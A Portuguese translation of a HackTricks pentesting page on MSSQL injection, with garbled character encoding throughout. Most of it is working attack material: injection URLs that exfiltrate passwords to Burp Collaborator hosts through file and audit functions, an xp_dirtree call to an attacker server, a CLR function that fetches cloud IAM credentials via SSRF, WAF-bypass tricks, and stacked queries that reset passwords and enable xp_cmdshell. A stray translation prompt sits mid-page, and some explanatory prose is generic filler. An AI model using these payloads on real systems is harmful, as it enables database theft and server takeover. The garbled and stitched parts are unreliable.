# Inje√ß√£o MSSQL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Enumera√ß√£o do Active Directory

Pode ser poss√≠vel **enumerar usu√°rios de dom√≠nio via inje√ß√£o SQL dentro de um servidor MSSQL** usando as seguintes fun√ß√µes MSSQL:

* **`SELECT DEFAULT_DOMAIN()`**: Obter o nome de dom√≠nio atual.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOM√çNIO\Administrador'))`**: Se voc√™ conhece o nome do dom√≠nio (_DOM√çNIO_ neste exemplo), esta fun√ß√£o retornar√° o **SID do usu√°rio Administrador** no formato hexadecimal. Isso parecer√° `0x01050000000[...]0000f401`, observe como os **√∫ltimos 4 bytes** s√£o o n√∫mero **500** no formato **big endian**, que √© o **ID comum do usu√°rio administrador**.\
Esta fun√ß√£o permitir√° que voc√™ **conhe√ßa o ID do dom√≠nio** (todos os bytes, exceto os √∫ltimos 4).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Esta fun√ß√£o retornar√° o **nome de usu√°rio do ID indicado** (se houver), neste caso **0000e803** em big endian == **1000** (geralmente este √© o ID do primeiro usu√°rio regular criado). Ent√£o voc√™ pode imaginar que pode for√ßar bruta IDs de usu√°rio de 1000 a 2000 e provavelmente obter todos os nomes de usu√°rio dos usu√°rios do dom√≠nio. Por exemplo, usando uma fun√ß√£o como a seguinte:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Vectores baseados em erros alternativos**

As inje√ß√µes de SQL baseadas em erros geralmente se assemelham a constru√ß√µes como `+AND+1=@@version--` e variantes baseadas no operador ¬´OR¬ª. Consultas contendo tais express√µes geralmente s√£o bloqueadas por WAFs. Como uma forma de contornar isso, concatene uma string usando o caractere %2b com o resultado de chamadas de fun√ß√£o espec√≠ficas que disparam um erro de convers√£o de tipo de dados nos dados desejados.

Alguns exemplos dessas fun√ß√µes:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Exemplo de uso da fun√ß√£o `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

### `fn_xe_file_target_read_file`

A fun√ß√£o `fn_xe_file_target_read_file` √© usada para ler arquivos no Microsoft SQL Server. No entanto, essa fun√ß√£o pode ser explorada para realizar um ataque de SSRF (Server-Side Request Forgery). 

O ataque de SSRF ocorre quando um invasor consegue fazer com que o servidor execute solicita√ß√µes em seu nome para outros sistemas internos ou externos. Isso pode levar a v√°rios problemas de seguran√ßa, como vazamento de informa√ß√µes confidenciais ou at√© mesmo comprometimento completo do sistema.

Para explorar essa vulnerabilidade, o invasor pode fornecer um caminho de arquivo malicioso como par√¢metro para a fun√ß√£o `fn_xe_file_target_read_file`. Isso far√° com que o servidor SQL execute a leitura do arquivo especificado pelo invasor.

√â importante mencionar que essa vulnerabilidade s√≥ pode ser explorada se o usu√°rio tiver permiss√µes para executar a fun√ß√£o `fn_xe_file_target_read_file`. Portanto, √© essencial garantir que as permiss√µes sejam configuradas corretamente para evitar poss√≠veis ataques de SSRF.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**Permiss√µes:** Requer permiss√£o **`VIEW SERVER STATE`** no servidor.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

A fun√ß√£o `fn_get_audit_file` √© uma fun√ß√£o espec√≠fica do Microsoft SQL Server que permite aos usu√°rios obter informa√ß√µes de auditoria de um arquivo espec√≠fico. Essa fun√ß√£o √© comumente usada para fins de monitoramento e an√°lise de seguran√ßa.

No entanto, √© importante ter cuidado ao usar essa fun√ß√£o, pois ela pode ser vulner√°vel a ataques de inje√ß√£o de SQL. Os invasores podem explorar essa vulnerabilidade para executar comandos maliciosos no banco de dados, comprometendo a integridade e a confidencialidade dos dados.

Para evitar ataques de inje√ß√£o de SQL, √© recomendado validar e sanitizar todas as entradas de dados antes de pass√°-las para a fun√ß√£o `fn_get_audit_file`. Isso pode ser feito por meio de t√©cnicas como a utiliza√ß√£o de par√¢metros parametrizados ou a implementa√ß√£o de filtros de entrada adequados.

Al√©m disso, √© importante manter o Microsoft SQL Server atualizado com as √∫ltimas corre√ß√µes de seguran√ßa e seguir as pr√°ticas recomendadas de seguran√ßa, como a aplica√ß√£o de princ√≠pios de privil√©gio m√≠nimo e a restri√ß√£o de acesso aos objetos do banco de dados.

Ao tomar essas precau√ß√µes, √© poss√≠vel utilizar a fun√ß√£o `fn_get_audit_file` de forma segura e eficaz, aproveitando seus recursos de auditoria sem comprometer a seguran√ßa do sistema.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**Permiss√µes:** Requer a permiss√£o **`CONTROL SERVER`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

A fun√ß√£o `fn_trace_gettabe` √© uma fun√ß√£o interna do Microsoft SQL Server que √© usada para obter informa√ß√µes de rastreamento de eventos. Essa fun√ß√£o retorna uma tabela tempor√°ria que cont√©m os dados de rastreamento capturados pelo SQL Server Profiler.

Essa fun√ß√£o pode ser explorada em um ataque de inje√ß√£o de SQL para obter informa√ß√µes sens√≠veis do banco de dados. Um invasor pode usar essa fun√ß√£o para extrair dados confidenciais, como nomes de usu√°rio, senhas e outras informa√ß√µes confidenciais armazenadas no banco de dados.

Para proteger contra ataques de inje√ß√£o de SQL que exploram a fun√ß√£o `fn_trace_gettabe`, √© importante implementar pr√°ticas de seguran√ßa recomendadas, como a valida√ß√£o adequada de entrada de dados, o uso de par√¢metros de consulta parametrizados e a restri√ß√£o de privil√©gios de acesso ao banco de dados.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**Permiss√µes:** Requer a permiss√£o **`CONTROL SERVER`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

O m√©todo mais comum para fazer uma chamada de rede que voc√™ encontrar√° usando o MSSQL √© o uso do Stored Procedure `xp_dirtree`, que estranhamente n√£o √© documentado pela Microsoft, o que fez com que ele fosse [documentado por outras pessoas na Internet](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/). Este m√©todo tem sido usado em [v√°rios exemplos](https://www.notsosecure.com/oob-exploitation-cheatsheet/) de posts de [exfiltra√ß√£o de dados fora de banda](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/) na Internet.

Essencialmente,
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
Assim como o `LOAD_FILE` do MySQL, voc√™ pode usar o `xp_dirtree` para fazer uma solicita√ß√£o de rede apenas para a porta TCP 445. Voc√™ n√£o pode controlar o n√∫mero da porta, mas pode ler informa√ß√µes de compartilhamentos de rede.

PS: Isso n√£o funciona no Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) em execu√ß√£o em um Windows Server 2016 Datacenter na configura√ß√£o padr√£o.

Existem outros procedimentos armazenados, como o `master..xp_fileexist` ou `xp_subdirs`, que podem ser usados para resultados semelhantes.

### `xp_cmdshell`

Obviamente, voc√™ tamb√©m pode usar o `xp_cmdshell` para executar algo que acione um SSRF. Para mais informa√ß√µes, leia a se√ß√£o relevante na p√°gina:

[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)

### Fun√ß√£o Definida pelo Usu√°rio MSSQL - SQLHttp

√â bastante simples escrever uma UDF CLR (Fun√ß√£o Definida pelo Usu√°rio em Tempo de Execu√ß√£o Comum - c√≥digo escrito em qualquer uma das linguagens .NET e compilado em um DLL) e carreg√°-la no MSSQL para fun√ß√µes personalizadas. No entanto, isso requer acesso `dbo`, portanto, pode n√£o funcionar a menos que a conex√£o do aplicativo da web ao banco de dados seja como `sa` ou uma fun√ß√£o de Administrador.

[Este reposit√≥rio do Github possui o projeto do Visual Studio e as instru√ß√µes de instala√ß√£o](https://github.com/infiniteloopltd/SQLHttp) para carregar o bin√°rio no MSSQL como uma montagem CLR e, em seguida, invocar solicita√ß√µes GET HTTP de dentro do MSSQL.

[O c√≥digo `http.cs` usa a classe `WebClient` para fazer uma solicita√ß√£o GET e buscar o conte√∫do](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/) conforme especificado.
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
Nas instru√ß√µes de instala√ß√£o, execute o seguinte antes da consulta `CREATE ASSEMBLY` para adicionar o hash SHA512 da montagem √† lista de assemblies confi√°veis no servidor (voc√™ pode ver a lista usando `select * from sys.trusted_assemblies;`)
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
Uma vez que a montagem √© adicionada e a fun√ß√£o criada, podemos executar o seguinte para fazer nossas solicita√ß√µes HTTP.
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/15.png)

## **Explora√ß√£o r√°pida: Recuperar uma tabela inteira em uma √∫nica consulta**

Existem duas maneiras simples de recuperar todo o conte√∫do de uma tabela em uma √∫nica consulta - o uso da cl√°usula FOR XML ou da cl√°usula FOR JSON. A cl√°usula FOR XML requer um modo especificado, como "raw", ent√£o em termos de brevidade, FOR JSON supera isso.

A consulta para recuperar o esquema, tabelas e colunas do banco de dados atual:
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

As vetores baseados em erros precisam de um alias ou um nome, pois a sa√≠da de express√µes sem eles n√£o pode ser formatada como JSON.
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **Recuperando a consulta atual**

A consulta SQL atual sendo executada pode ser recuperada do acesso `sys.dm_exec_requests` e `sys.dm_exec_sql_text`:
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/9.png)

**Permiss√µes:** Se o usu√°rio tiver permiss√£o VIEW SERVER STATE no servidor, o usu√°rio ver√° todas as sess√µes em execu√ß√£o na inst√¢ncia do SQL Server; caso contr√°rio, o usu√°rio ver√° apenas a sess√£o atual.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **Pequenos truques para contornar o WAF**

Caracteres de espa√ßo em branco n√£o padr√£o: %C2%85 ou %C2%A0:
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
Nota√ß√£o cient√≠fica (0e) e nota√ß√£o hexadecimal (0x) para ofuscar UNION:
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
Um ponto em vez de um espa√ßo em branco entre FROM e o nome da coluna:
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
\N separador entre SELECT e uma coluna descart√°vel:
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
### Bypassando WAF com consultas empilhadas n√£o convencionais

De acordo com [**este post de blog**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/), √© poss√≠vel empilhar consultas no MSSQL sem usar ";":

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Portanto, por exemplo, v√°rias consultas como:
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
O seguinte √© o conte√∫do de um livro sobre t√©cnicas de hacking. O conte√∫do a seguir √© do arquivo pentesting-web/sql-injection/mssql-injection.md. Traduza o texto relevante para o portugu√™s e retorne a tradu√ß√£o mantendo exatamente a mesma sintaxe de markdown e html. N√£o traduza coisas como c√≥digo, nomes de t√©cnicas de hacking, palavras de hacking, nomes de plataformas de nuvem/SaaS (como Workspace, aws, gcp...), a palavra 'leak', pentesting e tags de markdown. Tamb√©m n√£o adicione nada al√©m da tradu√ß√£o e da sintaxe de markdown.
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
Portanto, poderia ser poss√≠vel contornar diferentes WAFs que n√£o consideram essa forma de empilhamento de consultas. Por exemplo:
```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```
## Refer√™ncias

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
